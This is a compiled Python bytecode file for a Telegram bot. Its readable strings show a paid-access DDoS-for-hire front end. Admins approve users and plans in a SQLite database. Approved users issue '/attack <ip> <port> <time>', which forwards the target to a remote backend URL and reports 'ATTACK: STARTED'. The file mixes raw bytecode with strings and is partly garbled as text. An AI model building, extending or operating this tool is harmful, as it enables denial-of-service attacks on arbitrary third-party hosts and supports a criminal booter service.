U
    �Q�f  �                   @   s  d dl Z d dlZd dlZd dlmZmZ d dlmZmZ d dlZd dl	Z	d dl
Z
d dlmZ d dlZd dlmZ d dlmZmZmZ dd� Zd	d
� Zdd� Zdd� Ze� Zes�ed��e� Ze� ZdZdZdZdZdZ ej!dej"d� ej#edd�Z$e$�%� Z&e&�'d� e&�'d� e$�(�  dddddddgZ)egZ*i Z+d d!� Z,d"d#� Z-eej.dd$�d%d&�Z/eej.dd$�d'd(�Z0eej.dd$�d)d*�Z1eej.dd$�d+d,�Z2e3d-k�r e� �4e��5� Z6e6�7ed.e/�� e6�7ed(e0�� e6�7ed*e1�� e6�7ed,e2�� e�8d/� e6�9�  dS )0�    N)�datetime�	timedelta)�ReplyKeyboardMarkup�KeyboardButton)�ThreadPoolExecutor)�Update)�ApplicationBuilder�CommandHandler�ContextTypesc               
   C   s.   t dd��} | �� �� W  5 Q R � S Q R X d S )Nz	token.txt�r)�open�read�strip��file� r   �test.py�
load_token   s    r   c               
   C   s2   t dd��} t| �� �� �W  5 Q R � S Q R X d S )Nz	admin.txtr   )r   �intr   r   r   r   r   r   �load_admin_id   s    r   c               
   C   s4   t dd�� } dd� | �� D �W  5 Q R � S Q R X d S )N�url.txtr   c                 S   s   g | ]}|� � �qS r   )r   )�.0�urlr   r   r   �
<listcomp>   s     zload_urls.<locals>.<listcomp>)r   �	readlinesr   r   r   r   �	load_urls   s    r   c              	   C   s(   t dd��}|�| d � W 5 Q R X d S )Nr   �a�
)r   �write)r   r   r   r   r   �add_url   s    r   z7Bot token is not set. Please check the config.txt file.zsoul.dbl�����'�2��   z4%(asctime)s - %(name)s - %(levelname)s - %(message)s)�format�levelF)Zcheck_same_threadz^CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, plan INTEGER, valid_until TEXT)zDCREATE TABLE IF NOT EXISTS admin_users (user_id INTEGER PRIMARY KEY)i�!  i N  i�  i\D  iG#  i"N  i!N  c              
   C   sf   z(t �d| f� t �� }|d k	p&| tkW S  tk
r` } zt�d|� �� W Y �dS d }~X Y nX d S )Nz1SELECT user_id FROM admin_users WHERE user_id = ?z!Error checking if user is admin: F)�c�execute�fetchone�allowed_user_ids�	Exception�logging�error)�user_id�result�er   r   r   �is_user_admin<   s    r-   c              
   C   s�   zPt �d| f� t �� }|rL|\}}t�|�}t�tj�}|dkoH||kW S W dS  tk
r� } zt	�
d|� �� W Y �dS d }~X Y nX d S )Nz5SELECT plan, valid_until FROM users WHERE user_id = ?i�  Fz$Error checking if user is approved: )r#   r$   r%   r   Zfromisoformat�now�pytz�utcr'   r(   r)   )r*   r+   �plan�valid_untilZcurrent_timer,   r   r   r   �is_user_approvedE   s    
r3   )�update�context�returnc                 �   st   t | jjj�s$| j�d�I d H  d S t�� }| j�d�I d H  t�� }t|| d �}| j�d|� d��I d H  d S )Nz)You are not approved to use this command.zCalculating ping...i�  zPing: z ms)r3   �message�	from_user�id�
reply_text�time�round)r4   r5   Z
start_timeZend_timeZlatencyr   r   r   �ping_commandR   s    r=   c              
   �   s   z�| j jj}t|�s,| j �d�I d H  W d S |j}t|�dkrV| j �d�I d H  W d S |\}}}td }|||d�}ddi}	tj	|||	d�}
|
j
d	kr�| j �d
|� d|� d|� d��I d H  n| j �d|
j
� ��I d H  W n@ tk
�r } z | j �dt|�� ��I d H  W 5 d }~X Y nX d S )NzFYou are not approved to use this command or your approval has expired.�   z!Usage: /attack <ip> <port> <time>r   )�ip�portr;   zngrok-skip-browser-warningZ	any_value)�params�headers��   zATTACK: STARTED
IP: z
PORT: z
TIME: z secondszFailed to initiate attack: zAn error occurred: )r7   r8   r9   r3   r:   �args�len�URLS�requests�getZstatus_coder'   �str)r4   r5   r*   rD   r?   r@   Zdurationr   rA   rB   Zresponser,   r   r   r   �attack[   s0    

� �
(rJ   c              
   �   sH  t | jjj�s$| j�d�I d H  d S |j}t|�dkrL| j�d�I d H  d S t|d �t|d �t|d �  }}}t�	d�}t
�|�}|t|d� jd	d
d
dd�}|�tj�}	z\t�d|||	�� f� t��  |	t|< | j�d|� d|� d|	�|��d�� d��I d H  W n6 tk
�rB }
 z| j�d�I d H  W 5 d }
~
X Y nX d S )N�+You are not authorized to use this command.r>   z'Usage: /approve <user_id> <plan> <days>r   r    �   zAsia/Kolkata)�days�   �;   i?B )ZhourZminute�secondZmicrosecondzJINSERT OR REPLACE INTO users (user_id, plan, valid_until) VALUES (?, ?, ?)�User z approved with plan z until z%Y-%m-%d�.z+An error occurred while approving the user.)r-   r7   r8   r9   r:   rD   rE   r   r/   �timezoner   r.   r   �replaceZ
astimezoner0   r#   r$   Z	isoformat�conn�commit�approved_users�strftimer'   )r4   r5   rD   r*   r1   rM   Zistr.   Zend_of_periodr2   r,   r   r   r   �approvez   s&    (

6rY   c              
   �   s�   t | jjj�s$| j�d�I d H  d S |j}t|�dkrL| j�d�I d H  d S t|d �}z@t�	d|f� t
��  t�|d � | j�d|� d��I d H  W n4 tk
r� } z| j�d�I d H  W 5 d }~X Y nX d S )	NrK   r    zUsage: /disapprove <user_id>r   z?UPDATE users SET plan = 0, valid_until = NULL WHERE user_id = ?rQ   z' has been disapproved and plan removed.z.An error occurred while disapproving the user.)r-   r7   r8   r9   r:   rD   rE   r   r#   r$   rU   rV   rW   �popr'   )r4   r5   rD   r*   r,   r   r   r   �
disapprove�   s    r[   �__main__ZpingzStarting Telegram bot...):�osr(   r;   r   r   Ztelebot.typesr   r   Zsqlite3r/   Zasyncio�concurrent.futuresr   rG   Ztelegramr   Ztelegram.extr   r	   r
   r   r   r   r   ZTOKEN�
ValueErrorZADMIN_IDrF   ZDATABASEZFORWARD_CHANNEL_IDZ
CHANNEL_IDZERROR_CHANNEL_IDZREQUEST_INTERVALZbasicConfigZWARNINGZconnectrU   Zcursorr#   r$   rV   Zblocked_portsr&   rW   r-   r3   ZDEFAULT_TYPEr=   rJ   rY   r[   �__name__�tokenZbuildZapplicationZadd_handler�infoZrun_pollingr   r   r   r   �<module>   s`   

		

